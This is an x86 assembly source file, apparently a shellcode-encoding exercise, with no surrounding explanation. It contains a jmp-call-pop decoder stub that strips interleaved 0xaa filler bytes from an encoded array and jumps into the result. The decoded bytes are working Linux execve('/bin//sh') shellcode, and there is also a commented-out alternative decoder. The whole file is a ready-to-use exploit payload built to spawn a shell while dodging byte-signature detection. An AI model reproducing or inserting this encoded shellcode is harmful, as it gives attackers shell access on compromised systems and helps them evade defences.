global _start
section .text

_start:

	jmp short call_shellcode

decode1:
	pop esi
	lea edi,[esi]

	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	
iterate:
	mov bl,byte[esi+ecx]
	xor bl,0xbb
	jz  encoded_shellcode
	mov bl,byte[esi+ecx]
	mov byte [edi],bl
	add cl,0x2
	inc edi
	jmp short iterate
	



;decode:
;	mov bl,byte[esi + eax]
;	xor bl,0xaa
;	jnz short encoded_shellcode
;	mov bl, byte[esi+eax+1]
;	mov byte [edi], bl
;	inc edi
;	add al,0x2 
;	jmp short decode




call_shellcode:
	call decode1
	encoded_shellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x87,0xaa,0xe3,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa,0xbb

